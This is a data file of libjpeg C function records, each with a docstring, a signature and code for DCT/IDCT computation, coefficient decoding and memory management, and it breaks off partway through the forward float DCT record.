{"docstring": "/*\n * Prepare for an output pass.\n * Here we select the proper IDCT routine for each component and build\n * a matching multiplier table.\n */\n", "func_signal": "METHODDEF(void)\nstart_pass (j_decompress_ptr cinfo)", "code": "{\n  my_idct_ptr idct = (my_idct_ptr) cinfo->idct;\n  int ci, i;\n  jpeg_component_info *compptr;\n  int method = 0;\n  inverse_DCT_method_ptr method_ptr = NULL;\n  JQUANT_TBL * qtbl;\n\n  for (ci = 0, compptr = cinfo->comp_info; ci < cinfo->num_components;\n       ci++, compptr++) {\n    /* Select the proper IDCT routine for this component's scaling */\n    switch (compptr->DCT_scaled_size) {\n#ifdef IDCT_SCALING_SUPPORTED\n    case 1:\n      method_ptr = jpeg_idct_1x1;\n      method = JDCT_ISLOW;\t/* jidctred uses islow-style table */\n      break;\n    case 2:\n      method_ptr = jpeg_idct_2x2;\n      method = JDCT_ISLOW;\t/* jidctred uses islow-style table */\n      break;\n    case 4:\n      method_ptr = jpeg_idct_4x4;\n      method = JDCT_ISLOW;\t/* jidctred uses islow-style table */\n      break;\n#endif\n    case DCTSIZE:\n      switch (cinfo->dct_method) {\n#ifdef DCT_ISLOW_SUPPORTED\n      case JDCT_ISLOW:\n\tmethod_ptr = jpeg_idct_islow;\n\tmethod = JDCT_ISLOW;\n\tbreak;\n#endif\n#ifdef DCT_IFAST_SUPPORTED\n      case JDCT_IFAST:\n\tmethod_ptr = jpeg_idct_ifast;\n\tmethod = JDCT_IFAST;\n\tbreak;\n#endif\n#ifdef DCT_FLOAT_SUPPORTED\n      case JDCT_FLOAT:\n\tmethod_ptr = jpeg_idct_float;\n\tmethod = JDCT_FLOAT;\n\tbreak;\n#endif\n      default:\n\tERREXIT(cinfo, JERR_NOT_COMPILED);\n\tbreak;\n      }\n      break;\n    default:\n      ERREXIT1(cinfo, JERR_BAD_DCTSIZE, compptr->DCT_scaled_size);\n      break;\n    }\n    idct->pub.inverse_DCT[ci] = method_ptr;\n    /* Create multiplier table from quant table.\n     * However, we can skip this if the component is uninteresting\n     * or if we already built the table.  Also, if no quant table\n     * has yet been saved for the component, we leave the\n     * multiplier table all-zero; we'll be reading zeroes from the\n     * coefficient controller's buffer anyway.\n     */\n    if (! compptr->component_needed || idct->cur_method[ci] == method)\n      continue;\n    qtbl = compptr->quant_table;\n    if (qtbl == NULL)\t\t/* happens if no data yet for component */\n      continue;\n    idct->cur_method[ci] = method;\n    switch (method) {\n#ifdef PROVIDE_ISLOW_TABLES\n    case JDCT_ISLOW:\n      {\n\t/* For LL&M IDCT method, multipliers are equal to raw quantization\n\t * coefficients, but are stored as ints to ensure access efficiency.\n\t */\n\tISLOW_MULT_TYPE * ismtbl = (ISLOW_MULT_TYPE *) compptr->dct_table;\n\tfor (i = 0; i < DCTSIZE2; i++) {\n\t  ismtbl[i] = (ISLOW_MULT_TYPE) qtbl->quantval[i];\n\t}\n      }\n      break;\n#endif\n#ifdef DCT_IFAST_SUPPORTED\n    case JDCT_IFAST:\n      {\n\t/* For AA&N IDCT method, multipliers are equal to quantization\n\t * coefficients scaled by scalefactor[row]*scalefactor[col], where\n\t *   scalefactor[0] = 1\n\t *   scalefactor[k] = cos(k*PI/16) * sqrt(2)    for k=1..7\n\t * For integer operation, the multiplier table is to be scaled by\n\t * IFAST_SCALE_BITS.\n\t */\n\tIFAST_MULT_TYPE * ifmtbl = (IFAST_MULT_TYPE *) compptr->dct_table;\n#define CONST_BITS 14\n\tstatic const INT16 aanscales[DCTSIZE2] = {\n\t  /* precomputed values scaled up by 14 bits */\n\t  16384, 22725, 21407, 19266, 16384, 12873,  8867,  4520,\n\t  22725, 31521, 29692, 26722, 22725, 17855, 12299,  6270,\n\t  21407, 29692, 27969, 25172, 21407, 16819, 11585,  5906,\n\t  19266, 26722, 25172, 22654, 19266, 15137, 10426,  5315,\n\t  16384, 22725, 21407, 19266, 16384, 12873,  8867,  4520,\n\t  12873, 17855, 16819, 15137, 12873, 10114,  6967,  3552,\n\t   8867, 12299, 11585, 10426,  8867,  6967,  4799,  2446,\n\t   4520,  6270,  5906,  5315,  4520,  3552,  2446,  1247\n\t};\n\tSHIFT_TEMPS\n\n\tfor (i = 0; i < DCTSIZE2; i++) {\n\t  ifmtbl[i] = (IFAST_MULT_TYPE)\n\t    DESCALE(MULTIPLY16V16((INT32) qtbl->quantval[i],\n\t\t\t\t  (INT32) aanscales[i]),\n\t\t    CONST_BITS-IFAST_SCALE_BITS);\n\t}\n      }\n      break;\n#endif\n#ifdef DCT_FLOAT_SUPPORTED\n    case JDCT_FLOAT:\n      {\n\t/* For float AA&N IDCT method, multipliers are equal to quantization\n\t * coefficients scaled by scalefactor[row]*scalefactor[col], where\n\t *   scalefactor[0] = 1\n\t *   scalefactor[k] = cos(k*PI/16) * sqrt(2)    for k=1..7\n\t */\n\tFLOAT_MULT_TYPE * fmtbl = (FLOAT_MULT_TYPE *) compptr->dct_table;\n\tint row, col;\n\tstatic const double aanscalefactor[DCTSIZE] = {\n\t  1.0, 1.387039845, 1.306562965, 1.175875602,\n\t  1.0, 0.785694958, 0.541196100, 0.275899379\n\t};\n\n\ti = 0;\n\tfor (row = 0; row < DCTSIZE; row++) {\n\t  for (col = 0; col < DCTSIZE; col++) {\n\t    fmtbl[i] = (FLOAT_MULT_TYPE)\n\t      ((double) qtbl->quantval[i] *\n\t       aanscalefactor[row] * aanscalefactor[col]);\n\t    i++;\n\t  }\n\t}\n      }\n      break;\n#endif\n    default:\n      ERREXIT(cinfo, JERR_NOT_COMPILED);\n      break;\n    }\n  }\n}", "path": "jpeglib\\jddctmgr.c", "repo_name": "erwincoumans/experiments", "stars": 127, "license": "None", "language": "c", "size": 87151}
{"docstring": "/*\n * This routine computes the total memory space available for allocation.\n */\n", "func_signal": "GLOBAL(long)\njpeg_mem_available (j_common_ptr cinfo, long min_bytes_needed,\n\t\t    long max_bytes_needed, long already_allocated)", "code": "{\n  long limit = cinfo->mem->max_memory_to_use - already_allocated;\n  long slop, mem;\n\n  /* Don't ask for more than what application has told us we may use */\n  if (max_bytes_needed > limit && limit > 0)\n    max_bytes_needed = limit;\n  /* Find whether there's a big enough free block in the heap.\n   * CompactMem tries to create a contiguous block of the requested size,\n   * and then returns the size of the largest free block (which could be\n   * much more or much less than we asked for).\n   * We add some slop to ensure we don't use up all available memory.\n   */\n  slop = max_bytes_needed / 16 + 32768L;\n  mem = CompactMem(max_bytes_needed + slop) - slop;\n  if (mem < 0)\n    mem = 0;\t\t\t/* sigh, couldn't even get the slop */\n  /* Don't take more than the application says we can have */\n  if (mem > limit && limit > 0)\n    mem = limit;\n  return mem;\n}", "path": "jpeglib\\jmemmac.c", "repo_name": "erwincoumans/experiments", "stars": 127, "license": "None", "language": "c", "size": 87151}
{"docstring": "/*\n * Decompress and return some data in the multi-pass case.\n * Always attempts to emit one fully interleaved MCU row (\"iMCU\" row).\n * Return value is JPEG_ROW_COMPLETED, JPEG_SCAN_COMPLETED, or JPEG_SUSPENDED.\n *\n * NB: output_buf contains a plane for each component in image.\n */\n", "func_signal": "METHODDEF(int)\ndecompress_data (j_decompress_ptr cinfo, JSAMPIMAGE output_buf)", "code": "{\n  my_coef_ptr coef = (my_coef_ptr) cinfo->coef;\n  JDIMENSION last_iMCU_row = cinfo->total_iMCU_rows - 1;\n  JDIMENSION block_num;\n  int ci, block_row, block_rows;\n  JBLOCKARRAY buffer;\n  JBLOCKROW buffer_ptr;\n  JSAMPARRAY output_ptr;\n  JDIMENSION output_col;\n  jpeg_component_info *compptr;\n  inverse_DCT_method_ptr inverse_DCT;\n\n  /* Force some input to be done if we are getting ahead of the input. */\n  while (cinfo->input_scan_number < cinfo->output_scan_number ||\n\t (cinfo->input_scan_number == cinfo->output_scan_number &&\n\t  cinfo->input_iMCU_row <= cinfo->output_iMCU_row)) {\n    if ((*cinfo->inputctl->consume_input)(cinfo) == JPEG_SUSPENDED)\n      return JPEG_SUSPENDED;\n  }\n\n  /* OK, output from the virtual arrays. */\n  for (ci = 0, compptr = cinfo->comp_info; ci < cinfo->num_components;\n       ci++, compptr++) {\n    /* Don't bother to IDCT an uninteresting component. */\n    if (! compptr->component_needed)\n      continue;\n    /* Align the virtual buffer for this component. */\n    buffer = (*cinfo->mem->access_virt_barray)\n      ((j_common_ptr) cinfo, coef->whole_image[ci],\n       cinfo->output_iMCU_row * compptr->v_samp_factor,\n       (JDIMENSION) compptr->v_samp_factor, FALSE);\n    /* Count non-dummy DCT block rows in this iMCU row. */\n    if (cinfo->output_iMCU_row < last_iMCU_row)\n      block_rows = compptr->v_samp_factor;\n    else {\n      /* NB: can't use last_row_height here; it is input-side-dependent! */\n      block_rows = (int) (compptr->height_in_blocks % compptr->v_samp_factor);\n      if (block_rows == 0) block_rows = compptr->v_samp_factor;\n    }\n    inverse_DCT = cinfo->idct->inverse_DCT[ci];\n    output_ptr = output_buf[ci];\n    /* Loop over all DCT blocks to be processed. */\n    for (block_row = 0; block_row < block_rows; block_row++) {\n      buffer_ptr = buffer[block_row];\n      output_col = 0;\n      for (block_num = 0; block_num < compptr->width_in_blocks; block_num++) {\n\t(*inverse_DCT) (cinfo, compptr, (JCOEFPTR) buffer_ptr,\n\t\t\toutput_ptr, output_col);\n\tbuffer_ptr++;\n\toutput_col += compptr->DCT_scaled_size;\n      }\n      output_ptr += compptr->DCT_scaled_size;\n    }\n  }\n\n  if (++(cinfo->output_iMCU_row) < cinfo->total_iMCU_rows)\n    return JPEG_ROW_COMPLETED;\n  return JPEG_SCAN_COMPLETED;\n}", "path": "jpeglib\\jdcoefct.c", "repo_name": "erwincoumans/experiments", "stars": 127, "license": "None", "language": "c", "size": 87151}
{"docstring": "/*\n * Perform dequantization and inverse DCT on one block of coefficients,\n * producing a reduced-size 1x1 output block.\n */\n", "func_signal": "GLOBAL(void)\njpeg_idct_1x1 (j_decompress_ptr cinfo, jpeg_component_info * compptr,\n\t       JCOEFPTR coef_block,\n\t       JSAMPARRAY output_buf, JDIMENSION output_col)", "code": "{\n  int dcval;\n  ISLOW_MULT_TYPE * quantptr;\n  JSAMPLE *range_limit = IDCT_range_limit(cinfo);\n  SHIFT_TEMPS\n\n  /* We hardly need an inverse DCT routine for this: just take the\n   * average pixel value, which is one-eighth of the DC coefficient.\n   */\n  quantptr = (ISLOW_MULT_TYPE *) compptr->dct_table;\n  dcval = DEQUANTIZE(coef_block[0], quantptr[0]);\n  dcval = (int) DESCALE((INT32) dcval, 3);\n\n  output_buf[0][output_col] = range_limit[dcval & RANGE_MASK];\n}", "path": "jpeglib\\jidctred.c", "repo_name": "erwincoumans/experiments", "stars": 127, "license": "None", "language": "c", "size": 87151}
{"docstring": "/*\n * Decompress and return some data in the single-pass case.\n * Always attempts to emit one fully interleaved MCU row (\"iMCU\" row).\n * Input and output must run in lockstep since we have only a one-MCU buffer.\n * Return value is JPEG_ROW_COMPLETED, JPEG_SCAN_COMPLETED, or JPEG_SUSPENDED.\n *\n * NB: output_buf contains a plane for each component in image,\n * which we index according to the component's SOF position.\n */\n", "func_signal": "METHODDEF(int)\ndecompress_onepass (j_decompress_ptr cinfo, JSAMPIMAGE output_buf)", "code": "{\n  my_coef_ptr coef = (my_coef_ptr) cinfo->coef;\n  JDIMENSION MCU_col_num;\t/* index of current MCU within row */\n  JDIMENSION last_MCU_col = cinfo->MCUs_per_row - 1;\n  JDIMENSION last_iMCU_row = cinfo->total_iMCU_rows - 1;\n  int blkn, ci, xindex, yindex, yoffset, useful_width;\n  JSAMPARRAY output_ptr;\n  JDIMENSION start_col, output_col;\n  jpeg_component_info *compptr;\n  inverse_DCT_method_ptr inverse_DCT;\n\n  /* Loop to process as much as one whole iMCU row */\n  for (yoffset = coef->MCU_vert_offset; yoffset < coef->MCU_rows_per_iMCU_row;\n       yoffset++) {\n    for (MCU_col_num = coef->MCU_ctr; MCU_col_num <= last_MCU_col;\n\t MCU_col_num++) {\n      /* Try to fetch an MCU.  Entropy decoder expects buffer to be zeroed. */\n      jzero_far((void FAR *) coef->MCU_buffer[0],\n\t\t(size_t) (cinfo->blocks_in_MCU * SIZEOF(JBLOCK)));\n      if (! (*cinfo->entropy->decode_mcu) (cinfo, coef->MCU_buffer)) {\n\t/* Suspension forced; update state counters and exit */\n\tcoef->MCU_vert_offset = yoffset;\n\tcoef->MCU_ctr = MCU_col_num;\n\treturn JPEG_SUSPENDED;\n      }\n      /* Determine where data should go in output_buf and do the IDCT thing.\n       * We skip dummy blocks at the right and bottom edges (but blkn gets\n       * incremented past them!).  Note the inner loop relies on having\n       * allocated the MCU_buffer[] blocks sequentially.\n       */\n      blkn = 0;\t\t\t/* index of current DCT block within MCU */\n      for (ci = 0; ci < cinfo->comps_in_scan; ci++) {\n\tcompptr = cinfo->cur_comp_info[ci];\n\t/* Don't bother to IDCT an uninteresting component. */\n\tif (! compptr->component_needed) {\n\t  blkn += compptr->MCU_blocks;\n\t  continue;\n\t}\n\tinverse_DCT = cinfo->idct->inverse_DCT[compptr->component_index];\n\tuseful_width = (MCU_col_num < last_MCU_col) ? compptr->MCU_width\n\t\t\t\t\t\t    : compptr->last_col_width;\n\toutput_ptr = output_buf[compptr->component_index] +\n\t  yoffset * compptr->DCT_scaled_size;\n\tstart_col = MCU_col_num * compptr->MCU_sample_width;\n\tfor (yindex = 0; yindex < compptr->MCU_height; yindex++) {\n\t  if (cinfo->input_iMCU_row < last_iMCU_row ||\n\t      yoffset+yindex < compptr->last_row_height) {\n\t    output_col = start_col;\n\t    for (xindex = 0; xindex < useful_width; xindex++) {\n\t      (*inverse_DCT) (cinfo, compptr,\n\t\t\t      (JCOEFPTR) coef->MCU_buffer[blkn+xindex],\n\t\t\t      output_ptr, output_col);\n\t      output_col += compptr->DCT_scaled_size;\n\t    }\n\t  }\n\t  blkn += compptr->MCU_width;\n\t  output_ptr += compptr->DCT_scaled_size;\n\t}\n      }\n    }\n    /* Completed an MCU row, but perhaps not an iMCU row */\n    coef->MCU_ctr = 0;\n  }\n  /* Completed the iMCU row, advance counters for next one */\n  cinfo->output_iMCU_row++;\n  if (++(cinfo->input_iMCU_row) < cinfo->total_iMCU_rows) {\n    start_iMCU_row(cinfo);\n    return JPEG_ROW_COMPLETED;\n  }\n  /* Completed the scan */\n  (*cinfo->inputctl->finish_input_pass) (cinfo);\n  return JPEG_SCAN_COMPLETED;\n}", "path": "jpeglib\\jdcoefct.c", "repo_name": "erwincoumans/experiments", "stars": 127, "license": "None", "language": "c", "size": 87151}
{"docstring": "/*\n * Consume input data and store it in the full-image coefficient buffer.\n * We read as much as one fully interleaved MCU row (\"iMCU\" row) per call,\n * ie, v_samp_factor block rows for each component in the scan.\n * Return value is JPEG_ROW_COMPLETED, JPEG_SCAN_COMPLETED, or JPEG_SUSPENDED.\n */\n", "func_signal": "METHODDEF(int)\nconsume_data (j_decompress_ptr cinfo)", "code": "{\n  my_coef_ptr coef = (my_coef_ptr) cinfo->coef;\n  JDIMENSION MCU_col_num;\t/* index of current MCU within row */\n  int blkn, ci, xindex, yindex, yoffset;\n  JDIMENSION start_col;\n  JBLOCKARRAY buffer[MAX_COMPS_IN_SCAN];\n  JBLOCKROW buffer_ptr;\n  jpeg_component_info *compptr;\n\n  /* Align the virtual buffers for the components used in this scan. */\n  for (ci = 0; ci < cinfo->comps_in_scan; ci++) {\n    compptr = cinfo->cur_comp_info[ci];\n    buffer[ci] = (*cinfo->mem->access_virt_barray)\n      ((j_common_ptr) cinfo, coef->whole_image[compptr->component_index],\n       cinfo->input_iMCU_row * compptr->v_samp_factor,\n       (JDIMENSION) compptr->v_samp_factor, TRUE);\n    /* Note: entropy decoder expects buffer to be zeroed,\n     * but this is handled automatically by the memory manager\n     * because we requested a pre-zeroed array.\n     */\n  }\n\n  /* Loop to process one whole iMCU row */\n  for (yoffset = coef->MCU_vert_offset; yoffset < coef->MCU_rows_per_iMCU_row;\n       yoffset++) {\n    for (MCU_col_num = coef->MCU_ctr; MCU_col_num < cinfo->MCUs_per_row;\n\t MCU_col_num++) {\n      /* Construct list of pointers to DCT blocks belonging to this MCU */\n      blkn = 0;\t\t\t/* index of current DCT block within MCU */\n      for (ci = 0; ci < cinfo->comps_in_scan; ci++) {\n\tcompptr = cinfo->cur_comp_info[ci];\n\tstart_col = MCU_col_num * compptr->MCU_width;\n\tfor (yindex = 0; yindex < compptr->MCU_height; yindex++) {\n\t  buffer_ptr = buffer[ci][yindex+yoffset] + start_col;\n\t  for (xindex = 0; xindex < compptr->MCU_width; xindex++) {\n\t    coef->MCU_buffer[blkn++] = buffer_ptr++;\n\t  }\n\t}\n      }\n      /* Try to fetch the MCU. */\n      if (! (*cinfo->entropy->decode_mcu) (cinfo, coef->MCU_buffer)) {\n\t/* Suspension forced; update state counters and exit */\n\tcoef->MCU_vert_offset = yoffset;\n\tcoef->MCU_ctr = MCU_col_num;\n\treturn JPEG_SUSPENDED;\n      }\n    }\n    /* Completed an MCU row, but perhaps not an iMCU row */\n    coef->MCU_ctr = 0;\n  }\n  /* Completed the iMCU row, advance counters for next one */\n  if (++(cinfo->input_iMCU_row) < cinfo->total_iMCU_rows) {\n    start_iMCU_row(cinfo);\n    return JPEG_ROW_COMPLETED;\n  }\n  /* Completed the scan */\n  (*cinfo->inputctl->finish_input_pass) (cinfo);\n  return JPEG_SCAN_COMPLETED;\n}", "path": "jpeglib\\jdcoefct.c", "repo_name": "erwincoumans/experiments", "stars": 127, "license": "None", "language": "c", "size": 87151}
{"docstring": "/*\n * Perform dequantization and inverse DCT on one block of coefficients.\n */\n", "func_signal": "GLOBAL(void)\njpeg_idct_float (j_decompress_ptr cinfo, jpeg_component_info * compptr,\n\t\t JCOEFPTR coef_block,\n\t\t JSAMPARRAY output_buf, JDIMENSION output_col)", "code": "{\n  FAST_FLOAT tmp0, tmp1, tmp2, tmp3, tmp4, tmp5, tmp6, tmp7;\n  FAST_FLOAT tmp10, tmp11, tmp12, tmp13;\n  FAST_FLOAT z5, z10, z11, z12, z13;\n  JCOEFPTR inptr;\n  FLOAT_MULT_TYPE * quantptr;\n  FAST_FLOAT * wsptr;\n  JSAMPROW outptr;\n  JSAMPLE *range_limit = IDCT_range_limit(cinfo);\n  int ctr;\n  FAST_FLOAT workspace[DCTSIZE2]; /* buffers data between passes */\n  SHIFT_TEMPS\n\n  /* Pass 1: process columns from input, store into work array. */\n\n  inptr = coef_block;\n  quantptr = (FLOAT_MULT_TYPE *) compptr->dct_table;\n  wsptr = workspace;\n  for (ctr = DCTSIZE; ctr > 0; ctr--) {\n    /* Due to quantization, we will usually find that many of the input\n     * coefficients are zero, especially the AC terms.  We can exploit this\n     * by short-circuiting the IDCT calculation for any column in which all\n     * the AC terms are zero.  In that case each output is equal to the\n     * DC coefficient (with scale factor as needed).\n     * With typical images and quantization tables, half or more of the\n     * column DCT calculations can be simplified this way.\n     */\n    \n    if (inptr[DCTSIZE*1] == 0 && inptr[DCTSIZE*2] == 0 &&\n\tinptr[DCTSIZE*3] == 0 && inptr[DCTSIZE*4] == 0 &&\n\tinptr[DCTSIZE*5] == 0 && inptr[DCTSIZE*6] == 0 &&\n\tinptr[DCTSIZE*7] == 0) {\n      /* AC terms all zero */\n      FAST_FLOAT dcval = DEQUANTIZE(inptr[DCTSIZE*0], quantptr[DCTSIZE*0]);\n      \n      wsptr[DCTSIZE*0] = dcval;\n      wsptr[DCTSIZE*1] = dcval;\n      wsptr[DCTSIZE*2] = dcval;\n      wsptr[DCTSIZE*3] = dcval;\n      wsptr[DCTSIZE*4] = dcval;\n      wsptr[DCTSIZE*5] = dcval;\n      wsptr[DCTSIZE*6] = dcval;\n      wsptr[DCTSIZE*7] = dcval;\n      \n      inptr++;\t\t\t/* advance pointers to next column */\n      quantptr++;\n      wsptr++;\n      continue;\n    }\n    \n    /* Even part */\n\n    tmp0 = DEQUANTIZE(inptr[DCTSIZE*0], quantptr[DCTSIZE*0]);\n    tmp1 = DEQUANTIZE(inptr[DCTSIZE*2], quantptr[DCTSIZE*2]);\n    tmp2 = DEQUANTIZE(inptr[DCTSIZE*4], quantptr[DCTSIZE*4]);\n    tmp3 = DEQUANTIZE(inptr[DCTSIZE*6], quantptr[DCTSIZE*6]);\n\n    tmp10 = tmp0 + tmp2;\t/* phase 3 */\n    tmp11 = tmp0 - tmp2;\n\n    tmp13 = tmp1 + tmp3;\t/* phases 5-3 */\n    tmp12 = (tmp1 - tmp3) * ((FAST_FLOAT) 1.414213562) - tmp13; /* 2*c4 */\n\n    tmp0 = tmp10 + tmp13;\t/* phase 2 */\n    tmp3 = tmp10 - tmp13;\n    tmp1 = tmp11 + tmp12;\n    tmp2 = tmp11 - tmp12;\n    \n    /* Odd part */\n\n    tmp4 = DEQUANTIZE(inptr[DCTSIZE*1], quantptr[DCTSIZE*1]);\n    tmp5 = DEQUANTIZE(inptr[DCTSIZE*3], quantptr[DCTSIZE*3]);\n    tmp6 = DEQUANTIZE(inptr[DCTSIZE*5], quantptr[DCTSIZE*5]);\n    tmp7 = DEQUANTIZE(inptr[DCTSIZE*7], quantptr[DCTSIZE*7]);\n\n    z13 = tmp6 + tmp5;\t\t/* phase 6 */\n    z10 = tmp6 - tmp5;\n    z11 = tmp4 + tmp7;\n    z12 = tmp4 - tmp7;\n\n    tmp7 = z11 + z13;\t\t/* phase 5 */\n    tmp11 = (z11 - z13) * ((FAST_FLOAT) 1.414213562); /* 2*c4 */\n\n    z5 = (z10 + z12) * ((FAST_FLOAT) 1.847759065); /* 2*c2 */\n    tmp10 = ((FAST_FLOAT) 1.082392200) * z12 - z5; /* 2*(c2-c6) */\n    tmp12 = ((FAST_FLOAT) -2.613125930) * z10 + z5; /* -2*(c2+c6) */\n\n    tmp6 = tmp12 - tmp7;\t/* phase 2 */\n    tmp5 = tmp11 - tmp6;\n    tmp4 = tmp10 + tmp5;\n\n    wsptr[DCTSIZE*0] = tmp0 + tmp7;\n    wsptr[DCTSIZE*7] = tmp0 - tmp7;\n    wsptr[DCTSIZE*1] = tmp1 + tmp6;\n    wsptr[DCTSIZE*6] = tmp1 - tmp6;\n    wsptr[DCTSIZE*2] = tmp2 + tmp5;\n    wsptr[DCTSIZE*5] = tmp2 - tmp5;\n    wsptr[DCTSIZE*4] = tmp3 + tmp4;\n    wsptr[DCTSIZE*3] = tmp3 - tmp4;\n\n    inptr++;\t\t\t/* advance pointers to next column */\n    quantptr++;\n    wsptr++;\n  }\n  \n  /* Pass 2: process rows from work array, store into output array. */\n  /* Note that we must descale the results by a factor of 8 == 2**3. */\n\n  wsptr = workspace;\n  for (ctr = 0; ctr < DCTSIZE; ctr++) {\n    outptr = output_buf[ctr] + output_col;\n    /* Rows of zeroes can be exploited in the same way as we did with columns.\n     * However, the column calculation has created many nonzero AC terms, so\n     * the simplification applies less often (typically 5% to 10% of the time).\n     * And testing floats for zero is relatively expensive, so we don't bother.\n     */\n    \n    /* Even part */\n\n    tmp10 = wsptr[0] + wsptr[4];\n    tmp11 = wsptr[0] - wsptr[4];\n\n    tmp13 = wsptr[2] + wsptr[6];\n    tmp12 = (wsptr[2] - wsptr[6]) * ((FAST_FLOAT) 1.414213562) - tmp13;\n\n    tmp0 = tmp10 + tmp13;\n    tmp3 = tmp10 - tmp13;\n    tmp1 = tmp11 + tmp12;\n    tmp2 = tmp11 - tmp12;\n\n    /* Odd part */\n\n    z13 = wsptr[5] + wsptr[3];\n    z10 = wsptr[5] - wsptr[3];\n    z11 = wsptr[1] + wsptr[7];\n    z12 = wsptr[1] - wsptr[7];\n\n    tmp7 = z11 + z13;\n    tmp11 = (z11 - z13) * ((FAST_FLOAT) 1.414213562);\n\n    z5 = (z10 + z12) * ((FAST_FLOAT) 1.847759065); /* 2*c2 */\n    tmp10 = ((FAST_FLOAT) 1.082392200) * z12 - z5; /* 2*(c2-c6) */\n    tmp12 = ((FAST_FLOAT) -2.613125930) * z10 + z5; /* -2*(c2+c6) */\n\n    tmp6 = tmp12 - tmp7;\n    tmp5 = tmp11 - tmp6;\n    tmp4 = tmp10 + tmp5;\n\n    /* Final output stage: scale down by a factor of 8 and range-limit */\n\n    outptr[0] = range_limit[(int) DESCALE((INT32) (tmp0 + tmp7), 3)\n\t\t\t    & RANGE_MASK];\n    outptr[7] = range_limit[(int) DESCALE((INT32) (tmp0 - tmp7), 3)\n\t\t\t    & RANGE_MASK];\n    outptr[1] = range_limit[(int) DESCALE((INT32) (tmp1 + tmp6), 3)\n\t\t\t    & RANGE_MASK];\n    outptr[6] = range_limit[(int) DESCALE((INT32) (tmp1 - tmp6), 3)\n\t\t\t    & RANGE_MASK];\n    outptr[2] = range_limit[(int) DESCALE((INT32) (tmp2 + tmp5), 3)\n\t\t\t    & RANGE_MASK];\n    outptr[5] = range_limit[(int) DESCALE((INT32) (tmp2 - tmp5), 3)\n\t\t\t    & RANGE_MASK];\n    outptr[4] = range_limit[(int) DESCALE((INT32) (tmp3 + tmp4), 3)\n\t\t\t    & RANGE_MASK];\n    outptr[3] = range_limit[(int) DESCALE((INT32) (tmp3 - tmp4), 3)\n\t\t\t    & RANGE_MASK];\n    \n    wsptr += DCTSIZE;\t\t/* advance pointer to next row */\n  }\n}", "path": "jpeglib\\jidctflt.c", "repo_name": "erwincoumans/experiments", "stars": 127, "license": "None", "language": "c", "size": 87151}
{"docstring": "/*\n * Perform the forward DCT on one block of samples.\n */\n", "func_signal": "GLOBAL(void)\njpeg_fdct_float (FAST_FLOAT * data)", "code": "{\n  FAST_FLOAT tmp0, tmp1, tmp2, tmp3, tmp4, tmp5, tmp6, tmp7;\n  FAST_FLOAT tmp10, tmp11, tmp12, tmp13;\n  FAST_FLOAT z1, z2, z3, z4, z5, z11, z13;\n  FAST_FLOAT *dataptr;\n  int ctr;\n\n  /* Pass 1: process rows. */\n\n  dataptr = data;\n  for (ctr = DCTSIZE-1; ctr >= 0; ctr--) {\n    tmp0 = dataptr[0] + dataptr[7];\n    tmp7 = dataptr[0] - dataptr[7];\n    tmp1 = dataptr[1] + dataptr[6];\n    tmp6 = dataptr[1] - dataptr[6];\n    tmp2 = dataptr[2] + dataptr[5];\n    tmp5 = dataptr[2] - dataptr[5];\n    tmp3 = dataptr[3] + dataptr[4];\n    tmp4 = dataptr[3] - dataptr[4];\n    \n    /* Even part */\n    \n    tmp10 = tmp0 + tmp3;\t/* phase 2 */\n    tmp13 = tmp0 - tmp3;\n    tmp11 = tmp1 + tmp2;\n    tmp12 = tmp1 - tmp2;\n    \n    dataptr[0] = tmp10 + tmp11; /* phase 3 */\n    dataptr[4] = tmp10 - tmp11;\n    \n    z1 = (tmp12 + tmp13) * ((FAST_FLOAT) 0.707106781); /* c4 */\n    dataptr[2] = tmp13 + z1;\t/* phase 5 */\n    dataptr[6] = tmp13 - z1;\n    \n    /* Odd part */\n\n    tmp10 = tmp4 + tmp5;\t/* phase 2 */\n    tmp11 = tmp5 + tmp6;\n    tmp12 = tmp6 + tmp7;\n\n    /* The rotator is modified from fig 4-8 to avoid extra negations. */\n    z5 = (tmp10 - tmp12) * ((FAST_FLOAT) 0.382683433); /* c6 */\n    z2 = ((FAST_FLOAT) 0.541196100) * tmp10 + z5; /* c2-c6 */\n    z4 = ((FAST_FLOAT) 1.306562965) * tmp12 + z5; /* c2+c6 */\n    z3 = tmp11 * ((FAST_FLOAT) 0.707106781); /* c4 */\n\n    z11 = tmp7 + z3;\t\t/* phase 5 */\n    z13 = tmp7 - z3;\n\n    dataptr[5] = z13 + z2;\t/* phase 6 */\n    dataptr[3] = z13 - z2;\n    dataptr[1] = z11 + z4;\n    dataptr[7] = z11 - z4;\n\n    dataptr += DCTSIZE;\t\t/* advance pointer to next row */\n  }\n\n  /* Pass 2: process columns. */\n\n  dataptr = data;\n  for (ctr = DCTSIZE-1; ctr >= 0; ctr--) {\n    tmp0 = dataptr[DCTSIZE*0] + dataptr[DCTSIZE*7];\n    tmp7 = dataptr[DCTSIZE*0] - dataptr[DCTSIZE*7];\n    tmp1 = dataptr[DCTSIZE*1] + dataptr[DCTSIZE*6];\n    tmp6 = dataptr[DCTSIZE*1] - dataptr[DCTSIZE*6];\n    tmp2 = dataptr[DCTSIZE*2] + dataptr[DCTSIZE*5];\n    tmp5 = dataptr[DCTSIZE*2] - dataptr[DCTSIZE*5];\n    tmp3 = dataptr[DCTSIZE*3] + dataptr[DCTSIZE*4];\n    tmp4 = dataptr[DCTSIZE*3] - dataptr[DCTSIZE*4];\n    \n    /* Even part */\n    \n    tmp10 = tmp0 + tmp3;\t/* phase 2 */\n    tmp13 = tmp0 - tmp3;\n    tmp11 = tmp1 + tmp2;\n    tmp12 = tmp1 - tmp2;\n    \n    dataptr[DCTSIZE*0] = tmp10 + tmp11; /* phase 3 */\n    dataptr[DCTSIZE*4] = tmp10 - tmp11;\n    \n    z1 = (tmp12 + tmp13) * ((FAST_FLOAT) 0.707106781); /* c4 */\n    dataptr[DCTSIZE*2] = tmp13 + z1; /* phase 5 */\n    dataptr[DCTSIZE*6] = tmp13 - z1;\n    \n    /* Odd part */\n\n    tmp10 = tmp4 + tmp5;\t/* phase 2 */\n    tmp11 = tmp5 + tmp6;\n    tmp12 = tmp6 + tmp7;\n\n    /* The rotator is modified from fig 4-8 to avoid extra negations. */\n    z5 = (tmp10 - tmp12) * ((FAST_FLOAT) 0.382683433); /* c6 */\n    z2 = ((FAST_FLOAT) 0.541196100) * tmp10 + z5; /* c2-c6 */\n    z4 = ((FAST_FLOAT) 1.306562965) * tmp12 + z5; /* c2+c6 */\n    z3 = tmp11 * ((FAST_FLOAT) 0.707106781); /* c4 */\n\n    z11 = tmp7 + z3;\t\t/* phase 5 */\n    z13 = tmp7 - z3;\n\n    dataptr[DCTSIZE*5] = z13 + z2; /* phase 6 */\n    dataptr[DCTSIZE*3] = z13 - z2;\n    